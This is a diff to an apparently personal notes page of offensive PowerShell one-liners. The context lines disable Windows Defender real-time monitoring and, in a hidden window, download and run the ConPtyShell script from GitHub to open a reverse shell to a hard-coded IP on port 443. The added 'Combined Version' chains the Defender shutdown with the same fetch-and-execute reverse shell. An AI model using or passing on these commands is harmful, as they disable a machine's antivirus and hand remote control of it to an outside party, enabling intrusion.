@@ -41,7 +41,10 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 powershell -w hidden {IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
 ```
-
+### Combined Version - 
+```
+powershell -w hidden {Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -s 3; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 40.71.97.253 443}
+```
 
 
 This Page May Have Loads of Error's since I suck at english so avoid em pls lol...
